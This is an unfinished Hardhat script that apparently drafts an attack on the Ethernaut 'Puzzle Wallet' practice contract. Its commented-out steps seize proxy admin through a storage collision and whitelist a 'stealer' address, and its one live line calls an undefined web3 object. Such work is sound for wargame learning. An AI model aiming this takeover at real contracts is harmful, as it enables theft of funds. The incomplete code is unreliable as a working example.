const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  // const puzzleWalletProxyAddress = "0x84c0df5a8Fb8B194fC3be2058a45135421AA24d4";
  // const puzzleWalletProxy = await ethers.getContractAt("PuzzleProxy", puzzleWalletProxyAddress);
  // const puzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletProxyAddress);

  // get ownership of logic contract
  // set pendingAdmin to stealer's address
  // await puzzleWalletProxy.proposeNewAdmin(stealer.address);

  // whitelist stealer's address
  // await contract.addToWhitelist(stealer.address)

  // deposit
  const overrideSlotsSignature = web3.eth.abi.encodeFunctionSignature("overrideSlots()");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
